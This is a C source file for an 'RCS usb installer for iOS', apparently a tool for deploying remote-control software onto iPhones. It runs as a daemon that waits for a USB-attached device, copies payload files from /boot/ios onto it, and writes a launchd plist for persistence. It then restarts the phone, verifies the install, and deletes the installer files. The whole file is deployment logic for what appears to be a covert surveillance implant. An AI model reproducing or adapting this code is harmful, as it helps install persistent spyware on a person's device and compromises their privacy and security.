//
//  main.c
//  RCS usb installer for iOS
//
//  Created by armored on 2/6/13.
//  Copyright (c) HT srl 2013 Massimo Chiodini. All rights reserved.
//

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include "../iOSUsbSupport.h"
#include <syslog.h>
#include <signal.h>

#define IOS_INSTALL_DIR "/boot/ios"

volatile int sigcount=0;

#define SET_WATCHDOG {sigcount=1; alarm(30);}
#define RESET_WATCHDOG sigcount=0;

/*
 * watchdog to prevent locking...
 */ 
void watchdog( int sig ) 
{    
  if (sigcount == 1)
  {
    syslog(LOG_INFO, "watchdog service routine: timeout reached restarting...\n");
    exit(-1);
  }
}

/*
 * safe ios usb calls
 */
char *safe_get_version()
{
  char *version = NULL;
  
  SET_WATCHDOG;

  version = get_version();
  
  RESET_WATCHDOG;
  
  return version;
}

char *safe_get_model()
{
  char *model = NULL;

  SET_WATCHDOG;

  model = get_model();
    
  RESET_WATCHDOG;

  return model;
}

int  safe_check_installation(int sec, int max_repeat)
{
  int ret;

  SET_WATCHDOG;

  ret = check_installation(sec, max_repeat);

  RESET_WATCHDOG;

  return ret;
}

idevice_error_t safe_make_install_directory()
{
  int ret;

  SET_WATCHDOG;

  ret = make_install_directory();

  RESET_WATCHDOG;

  return ret;
}

idevice_error_t safe_copy_install_files(char *lpath, char **dir_content)
{
  int ret;

  SET_WATCHDOG;

  ret = copy_install_files(lpath, dir_content);

  RESET_WATCHDOG;

  return ret;
}

idevice_error_t safe_create_launchd_plist()
{
  int ret;

  SET_WATCHDOG;

  ret = create_launchd_plist();

  RESET_WATCHDOG;

  return ret;
}

int safe_restart_device()
{
  int ret;

  SET_WATCHDOG;

  ret = restart_device();

  RESET_WATCHDOG;

  return ret;
}

int safe_remove_installation()
{
  int ret;

  SET_WATCHDOG;

  ret = remove_installation();

  RESET_WATCHDOG;

  return ret;
}

 /*
  * Entry point
  */
int main(int argc, const char * argv[])
{
  int devAttach = 0;
  char *version = NULL;
  char *model   = NULL;
  struct sigaction sact;

  sigemptyset( &sact.sa_mask );
  sact.sa_flags = 0;
  sact.sa_handler = watchdog;
  
  sigaction(SIGALRM, &sact, NULL);
  
  // if (argv[1] != NULL && strcmp(argv[1], "--nodaemon") == 0)
  // {
  //   syslog(LOG_INFO, "Running %s in foreground...\n", argv[0]);
  // }
  // else
  // {
  //   pid_t pid;

  //   syslog(LOG_INFO, "Running daemon...\n");

  //   pid = fork();
    
  //   if (pid < 0) {
  //      exit(EXIT_FAILURE);
  //   }

  //   if (pid > 0) {
  //           exit(EXIT_SUCCESS);
  //   }
  // }

  syslog(LOG_INFO, "Running ios usb daemon [%d]\n", getpid());
  syslog(LOG_INFO, "Waiting for device...\n");

  while(1)
  {
retry_installation:

    while(devAttach == 0)
    {
      sleep(1);
      devAttach = isDeviceAttached();
    }

    syslog(LOG_INFO, "Device attached!\n");

    version = safe_get_version();

    model = safe_get_model();

    if (model != NULL)
      syslog(LOG_INFO, "Model:   %s", model);
    
    if (version != NULL)
      syslog(LOG_INFO, "Version: %s", version);

    sleep(1);

    if (safe_check_installation(1, 2) == 1)
    {
      syslog(LOG_INFO, "Device already installed!\n");
      
      sleep (5);

      goto retry_installation;
    } 

    syslog(LOG_INFO, "start installation...\n");

    char **dir_content = list_dir_content(IOS_INSTALL_DIR);

    if (dir_content[0] == NULL)
    {
      syslog(LOG_INFO, "cannot found installation dir!\n");
      goto retry_installation;
    }

    syslog(LOG_INFO, "create installation dir...\n");

    if (safe_make_install_directory() != 0)
    {
      syslog(LOG_INFO, "cannot create installer folder\n");
  	  goto retry_installation;
    }
    else
      syslog(LOG_INFO,"done!");

    syslog(LOG_INFO, "copy files...");

    if (safe_copy_install_files(IOS_INSTALL_DIR, dir_content) != 0)
    {
      syslog(LOG_INFO, "\ncannot copy files in installer folder\n");
  	  goto retry_installation;
    }
    else
      syslog(LOG_INFO,"done!");

    if (safe_create_launchd_plist() != 0)
    {
     syslog(LOG_INFO, "cannot create plist files\n");
     goto retry_installation;
    }

    syslog(LOG_INFO, "try to restart device...");

    if (safe_restart_device() == 1)
    {
      syslog(LOG_INFO, "device restarting\n");
    }
    else 
    {
      syslog(LOG_INFO, "\ncan't restart device: try it manually!\n");
    }

    sleep(1);

    int isDeviceOn = 0;

    // Wait for device off
    do
    {
      isDeviceOn = isDeviceAttached();
      sleep(1);
    } while(isDeviceOn == 1);

    // Wait for device on
    do
    {
      isDeviceOn = isDeviceAttached();
      sleep(1);
    } while(isDeviceOn == 0);

    syslog(LOG_INFO, "device connected\n");

    syslog(LOG_INFO, "checking installation...\n");

    if (safe_check_installation(10, 10) == 1)
    {
  	 syslog(LOG_INFO, "done!\n");

  	 if (safe_remove_installation() == 0)
  		syslog(LOG_INFO, "cannot remove installation file!\n");
    }
    else
    {
  	 syslog(LOG_INFO, "installation failed: please retry!\n");
    }
  }

  return 0;
}



